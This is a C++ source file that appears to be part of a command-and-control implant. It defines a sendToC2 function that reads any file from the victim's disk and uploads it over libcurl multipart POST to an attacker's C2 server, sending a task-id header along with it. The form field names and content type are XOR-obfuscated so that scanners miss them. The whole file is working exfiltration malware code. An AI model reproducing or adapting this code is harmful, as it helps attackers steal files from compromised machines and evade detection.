#include <string>
#include <fstream>
#include <iostream>
#include <curl/curl.h>
#include <vector>
#include "xor.h"


using namespace std;
int KEY = 0x21;

/*
* example use case: sendToC2(path, url, filename) where path is the path to the file(include the filename), url is the url 
* with format ip:port/endpoint, filename being the file name C2 going to recive after calling get file name in python code
*/
//https://stackoverflow.com/questions/38320819/c-curl-send-mulipart-form-data-file-to-webserver
void sendToC2(string path, string url, string filename, string taskid) {
	struct curl_slist* headers = NULL;
	string s = xor_string("HE", KEY) + taskid;
	headers = curl_slist_append(headers, s.c_str());
	std::string contents;
	std::ifstream in(path, std::ios::in | std::ios::binary);
	if (in)
	{
		in.seekg(0, std::ios::end);
		contents.resize(in.tellg());
		in.seekg(0, std::ios::beg);
		in.read(&contents[0], contents.size());
		in.close();
	}
	CURL* curl;
	CURLcode res;
	struct curl_httppost* formpost = NULL;
	struct curl_httppost* lastptr = NULL;
	curl_global_init(CURL_GLOBAL_ALL);
	curl_formadd(&formpost,
		&lastptr,
		CURLFORM_COPYNAME, xor_string("BNOUDOUUXQD", KEY).c_str(),
		CURLFORM_COPYCONTENTS, xor_string("LTMUHQ@SUGNSLE@U@", KEY).c_str(),
		CURLFORM_END);
	curl_formadd(&formpost, &lastptr,
		CURLFORM_COPYNAME, xor_string("GHMD", KEY).c_str(),
		CURLFORM_BUFFER, filename.c_str(),
		CURLFORM_BUFFERPTR, contents.data(),
		CURLFORM_BUFFERLENGTH, contents.size(),
		CURLFORM_END);
	curl = curl_easy_init();
	if (curl){
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		curl_formfree(formpost);
	}
}
